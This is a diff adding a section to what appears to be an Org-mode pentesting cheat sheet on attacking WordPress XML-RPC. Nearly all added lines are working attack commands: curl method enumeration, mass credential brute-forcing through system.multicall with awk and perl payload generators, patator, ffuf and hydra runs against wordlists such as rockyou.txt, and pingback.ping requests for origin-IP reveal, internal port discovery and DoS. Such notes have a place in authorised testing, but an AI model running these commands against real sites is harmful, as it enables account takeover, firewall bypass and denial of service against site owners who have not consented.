@@ -3241,6 +3241,71 @@
           # Enumerate all plugins/themes
           wpscan --url <url> -e at,ap --api-token <id>
         #+end_src
+***** XML-RPC
+****** Supported Functions
+      - Call ~system.listMethods~:
+        #+begin_src sh
+          curl -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' -H 'Content-Type: text/xml' <url>/xmlrpc.php
+        #+end_src
+      - Try interacting with a test method:
+        #+begin_src sh
+          # For example: demo.sayHello
+          curl -d '<?xml version="1.0"?> <methodCall><methodName>demo.sayHello</methodName><params></params></methodCall>' -H 'Content-Type: text/xml' <url>/xmlrpc.php
+        #+end_src
+      - Or try with a [[https://developer.wordpress.org/apis/handbook/xml-rpc/][common one]]:
+        #+begin_src sh
+          # For example: wp.getUsersBlogs
+          curl -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>USER</value></param><param><value>PASS</value></param></params></methodCall>' -H 'Content-Type: text/xml' <url>/xmlrpc.php
+        #+end_src
+****** Credential Bruteforce
+      - Multi-attempts in one request:
+        #+begin_src sh
+          # First check if system.multicall works
+          curl -d @<(awk -vMULTI=1000 -vUSER='<user>' -vORS='' -vbegin='<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>' -vend='</data></array></value></param></params></methodCall>\n' 'BEGIN{print begin;++MULTI};!(NR%MULTI){print end begin}$0="<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>"USER"</string></v→
+          # If so, find the max MULTI allowed
+
+          # Patator - 650 req 3 threads - 5 req/s
+          # rockyou.txt takes around 1h
+          # For more edit multiprocessing maxsize
+          patator http_fuzz url='<path-to>/xmlrpc.php' header='Content-Type: text/xml' method='POST' auto_urlencode=0 body='PROG0' 0="/tmp/test.sh <dict>"  --allow-ignore-failures -x ignore:code='xxx' -x ignore:fgrep!='blogid' -x quit:fgrep='blogid'-t 3
+
+         # Create /tmp/test.sh with the following
+          #!/usr/bin/env -S perl -pl
+
+          # Set $maxsize to patator multi maxsize
+          BEGIN{$multi=650;$user='<user>';my$maxsize=10000;use Fcntl;fcntl+STDOUT,Fcntl->F_SETPIPE_SZ,$maxsize;undef$\;print$begin='<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>';$end='</data></array></value></param></params></methodCall>\n';++$multi};print$end,$begin,unless$.%$multi;$_="<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value>→
+          # Setting the pipe with fcntl is an
+          # alternative to setting it on
+          # patator's pipesize subprocess.Popen
+          # on the ProgIter class
+          # Check the buffer size with (cat req):
+          # perl -MFcntl -E 'say+fcntl+STDOUT,Fcntl->F_GETPIPE_SZ,0' | cat
+
+          # ffuf only allows 100 - Doesn't stop
+          # rockyou.txt takes around 7h and has
+          # to be divided to prevent OOM
+          awk -vMULTI=100 ... | sed -n '1,100000p' | ffuf -u "<url>/xmlrpc.php" -c -mr 'blogName' -H 'Content-Type: text/xml' -d 'FUZZ' -w - -t 2
+          # Note that -input-cmd results in OOM
+
+          # Hydra is unable to do this attack
+          # because ^PASS^ max chars are 255
+        #+end_src
+      - No ~multicall~, slower than login form:
+        #+begin_src sh
+          # Via wp.getUsersBlogs - Doesn't stop
+          ffuf -u "<url>/xmlrpc.php" -c -ac -ic -H 'Content-Type: text/xml' -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>USER</value></param><param><value>FUZZ</value></param></params></methodCall>' -w <dict>
+
+          # Via wp.getPosts - Stops on first res
+          hydra -f -l none -P <dict> <ip> http-post-form '/<path-to>/xmlrpc.php:<?xml version="1.0"?><methodCall><methodName>wp.getPosts</methodName><params><param><value>0</value></param><param><value>USER</value></param><param><value>^PASS^</value></param></params></methodCall>:403:H=Content-Type\: text/xml'
+        #+end_src
+****** Pingback Attack
+      - Useful for IP reveal (WAF bypass), Port Discovery (XSPA) and DoS - [[https://developer.wordpress.org/reference/classes/wp_xmlrpc_server/pingback_ping/][reference]]:
+        #+begin_src sh
+          # Try a https://postb.in/ as URL-FROM
+          # URL-TO is: <site/127>/wordpress/?p=1
+          curl -d '<?xml version="1.0"?> <methodCall><methodName>pingback.ping</methodName><params><param><value> <string>URL-FROM</string> </value></param><param><value> <string>URL-TO</string> </value></param></params></methodCall>' -H 'Content-Type: text/xml' <url>/xmlrpc.php
+          # faultCode>0 means open URL-FROM port
+        #+end_src
 ***** Privilege Escalation
 ****** Database
 ******* Notes
